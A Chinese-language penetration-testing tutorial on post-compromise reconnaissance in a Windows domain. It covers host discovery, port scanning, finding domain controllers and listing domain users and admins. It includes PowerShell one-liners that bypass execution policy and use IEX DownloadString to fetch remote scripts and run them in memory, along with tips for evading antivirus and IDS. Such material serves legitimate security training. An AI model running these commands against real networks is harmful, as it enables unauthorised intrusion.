## 1.判断是否有域

`ipconfig /all`  
![](https://image.3001.net/images/20210730/1627617656_610379788b2a9393f5ab6.png!small)`systeminfo`  
![](https://image.3001.net/images/20210730/1627617657_610379793b5f2a7dc15fe.png!small)`net
config workstation`  
![](https://image.3001.net/images/20210730/1627617657_61037979c359bb4b481ec.png!small)`net
time /domain`

判断主域，一般域服务器都会同时作为时间服务器

这里分为3中情况：

 **存在域，并且当前用户是域用户**  
![](https://image.3001.net/images/20210730/1627617658_6103797a5288a3ee46bfa.png!small)

 **不存在域，当前网络环境为工作组**  
![](https://image.3001.net/images/20210730/1627617659_6103797b2a341eb8c0f4d.png!small)

 **存在域，但当前用户不是域用户**  
![](https://image.3001.net/images/20210730/1627617659_6103797b9b8b66302dc8e.png!small)

## 2.域内主机探测

（避免使用暴力扫描工具或图形化工具触发反病毒软件）  
（可以在白天和晚上各探测一遍来分析主机的存活数量）  
`nbtscan.exe`

> 下载链接：[nbtscan-1.0.35.exe](http://www.unixwiz.net/tools/nbtscan-1.0.35.exe)

![](https://image.3001.net/images/20210730/1627617660_6103797c2c0da77efccc0.png!small)

扫描结果  
 **sharing** :可能有打印共享服务  
 **DC** : 可能是域控制器  
 **U=user** :可能是登录名为user的用户  
 **IIS** :可能安装了IIS服务器  
 **EXCHANEGE** :可能安装了微软的exchange  
 **?** :未识别出该机器的NETBIOS资源，可使用-f继续扫描

`利用icmp协议扫描`

 **ping**

    
    
    for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr “TTL=”
    

![](https://image.3001.net/images/20210730/1627617660_6103797cbe176dd45b63a.png!small)

**VBS**

    
    
    strSubNet = "192.168.33."
    Set objFSO= CreateObject("Scripting.FileSystemObject")
    Set objTS = objfso.CreateTextFile("C:\Users\test1\AppData\Local\Temp\res.txt")
    For i = 1 To 254
    strComputer = strSubNet & i
    blnResult = Ping(strComputer)
    If blnResult = True Then
    objTS.WriteLine "Ping " & strComputer & " success!"
    End If
    Next
    
    objTS.Close
    WScript.Echo "Done!"
    Function Ping(strComputer)
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colItems = objWMIService.ExecQuery("Select * From Win32_PingStatus Where Address='" & strComputer & "'")
    For Each objItem In colItems
    Select case objItem.StatusCode
    Case 0
    Ping = True
    Case Else
    Ping = False
    End select
    Exit For
    Next
    End Function
    

允许此脚本后会在%temp%路径下生成res.txt文件，里面会显示存活的主机名  
![](https://image.3001.net/images/20210730/1627617661_6103797d68fab78eb5399.png!small)  
![](https://image.3001.net/images/20210730/1627617661_6103797dd8bbe3380894d.png!small)  
`利用ARP扫描`

 **arp-scan**

> github下载链接：[arp-> scan.exe](https://raw.githubusercontent.com/QbsuranAlang/arp-scan-> windows-/master/arp-scan/Release\(x64\)/arp-scan.exe)（需要特定网络环境）

![](https://image.3001.net/images/20210730/1627617662_6103797e5efd595496a50.png!small)  
可见除了广播地址一共扫出来3个主机，而前面使用icmp只扫描出2个，这是因为有些有些系统默认是禁止ICMP的，所以使用多种方法更有效找到所有存活主机。

`Nishang 中的 Invoke-ARPScan.ps1 脚本`

> github下载链接：[Invoke-> ARPScan.ps1](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-> ARPScan.ps1)（需要特定网络环境）

这里也有3中方式：

本地运行

    
    
    powershell.exe -exec bypass -Command “& {Import-Module C:\Users\test1\Desktop\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.33.0/24}” >> C:\Users\test1\Desktop\log.txt
    

![](https://image.3001.net/images/20210730/1627617663_6103797f0ccb21d89e184.png!small)

远程运行

    
    
    powershell.exe -exec bypass -c "IEX{New-Object Net.WebClient}.DownloadString(‘脚本地址’);invoke-ARPScan-CIDR 192.168.1.1/24">>C:\windows\temp\log.txt：
    

  3. 无文件运行（没有运行文件，在内存中运行）

    
    
    powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.33.1/PowerSploit-master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 192.168.33.0/24 -T 4 -ports '445,1433,8080,3389,80' -oA c:\windows\temp\res.txt"
    

`利用TCP/UDP扫描探测`

ScanLine

> 下载链接：[ScanLine](http://bj.ddooo.com/ScanLine_11258.rar)
    
    
    sl.exe -h -t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O C:\Users\test1\AppData\Local\Temp\log.txt -p 192.168.33.1-254 /b
    

![](https://image.3001.net/images/20210730/1627617663_6103797f921f88a59f3d0.png!small)

## 3.域内端口扫描

扫描注意是否会触发IDS

Powersploit的invoke-portscan.ps1脚本﻿

> github下载链接：[invoke-> portscan.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-> Portscan.ps1)
    
    
    powershell.exe -exec bypass -Command "& {Import-Module "C:\Users\test1\AppData\Local\Temp\Invoke-Portscan.ps1";Invoke-Portscan -Hosts 192.168.33.0/24 -T 4 -ports '445,1433,80,8080,3389' -oA c:\ProgramData\ip_info"}
    

执行结束后会生成一个ip_info.xml的文件会显示出扫描结果：  
![](https://image.3001.net/images/20210730/1627617664_6103798032019a46a5d14.png!small)命令格式：

    
    
    powershell.exe -exec bypass -Command "& {Import-Module C:\PowerView.ps1; powerview的命令参数}"
    

端口 Banner 信息﻿  
![](https://image.3001.net/images/20210730/1627617665_61037981043be2ee3135a.png!small)

## 4.域内控制器的查找

nltest /dclist:yuaneuro.cn﻿  
![](https://image.3001.net/images/20210730/1627617665_61037981f2e2936984d17.png!small)nslookup
-type=SRV _ldap._tcp  
net time /domain  
net group "domain controllers" /domain  
![](https://image.3001.net/images/20210730/1627617667_610379839a242e59ad642.png!small)

## 5.域内用户和管理员的获取

#### 查询所有域用户列表

net user /domai`n`  
![](https://image.3001.net/images/20210730/1627617668_610379841b31c265273ef.png!small)wmic
useraccount get /all﻿  
![](https://image.3001.net/images/20210730/1627617668_61037984af4107e311881.png!small)

net localgroup administrators /domain﻿  
![](https://image.3001.net/images/20210730/1627617669_610379858981d51863db6.png!small)dsquery
user﻿  
只能在DC上执行  
![](https://image.3001.net/images/20210730/1627617670_610379860c7ae0e11f0c2.png!small)

#### 查询域管理员用户组

net group "domain admins" /domain﻿  
![](https://image.3001.net/images/20210730/1627617670_61037986802bd9140d2be.png!small)net
group "Enterprise admins" /domain  
![](https://image.3001.net/images/20210730/1627617671_6103798704166ccecbe09.png!small)

